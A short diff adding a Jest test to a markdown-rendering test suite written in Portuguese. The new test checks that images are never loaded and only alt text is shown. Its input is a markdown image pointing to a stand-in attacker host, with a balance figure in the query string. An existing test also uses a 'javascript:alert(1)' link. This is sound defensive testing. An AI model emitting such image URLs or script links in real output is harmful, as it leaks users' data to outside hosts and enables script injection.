@@ -42,4 +42,11 @@ describe('MarkdownResposta', () => {
 
   it('neutraliza link javascript:', () =>
     expect(html('[x](javascript:alert(1))')).not.toContain('javascript:'));
+
+  it('nunca carrega imagens: mostra só o texto alternativo', () => {
+    const out = html('![grafico](https://evil.example/x.png?saldo=78000)');
+    expect(out).not.toContain('<img');
+    expect(out).not.toContain('evil.example');
+    expect(out).toContain('grafico');
+  });
 });
